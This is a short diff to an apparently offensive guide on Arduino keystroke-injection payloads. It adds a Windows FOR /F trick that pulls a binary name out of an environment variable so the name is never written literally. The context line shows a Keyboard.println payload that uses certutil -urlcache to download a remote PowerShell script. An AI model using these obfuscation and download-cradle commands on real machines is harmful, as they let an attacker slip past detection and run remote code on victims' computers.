@@ -226,6 +226,9 @@ We use the ```\"``` to scape the double quotes in Arduino code.
 ### Obfuscating Binary Names
 #### For Loop Value Extraction
 
+```FOR /F “delims=s\ tokens=4” %a IN (‘set^|findstr PSM’)DO %a```
+
+Example:
 ```c
 Keyboard.println(" FOR /F \"delims=/ tokens=1\" %a IN ('where certutil')DO %a -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");
 ```
